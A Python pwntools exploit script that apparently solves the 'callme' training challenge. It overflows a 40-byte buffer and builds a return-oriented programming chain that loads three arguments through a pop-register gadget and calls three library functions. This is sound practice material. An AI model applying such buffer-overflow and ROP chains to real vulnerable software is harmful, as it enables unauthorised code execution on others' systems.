from pwn import *

DEBUG = False

if DEBUG:
    context.log_level = 'debug'
    context.terminal = ["tmux", "splitw", "-h", '-f']
    os.environ["SHELL"] = "/bin/sh"
else:
    context.log_level = 'info'


file = './callme'
elf = context.binary = ELF(file)

usefulGadgets = elf.symbols['usefulGadgets'] # pop args into RDI RSI and RDX see disassembly below

'''pwndbg> disass usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:     pop    rdi
   0x000000000040093d <+1>:     pop    rsi
   0x000000000040093e <+2>:     pop    rdx
   0x000000000040093f <+3>:     ret
End of assembler dump.
'''

callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

offset = 40

if DEBUG:
    p = gdb.debug(file, '''b usefulGadgets
    c''')
else:
    p = process()

p.recvuntil(b'> ')

#rop chain args must be in RDI RSI and RDX -> https://en.wikipedia.org/wiki/X86_calling_conventions 
chain = p64(usefulGadgets) + p64(arg1) + p64(arg2) + p64(arg3) + p64(callme_one) + \
p64(usefulGadgets) + p64(arg1) + p64(arg2) + p64(arg3) + p64(callme_two) + \
p64(usefulGadgets) + p64(arg1) + p64(arg2) + p64(arg3) + p64(callme_three)

p.sendline(b'A' * offset + chain)
log.info(p.recvall())

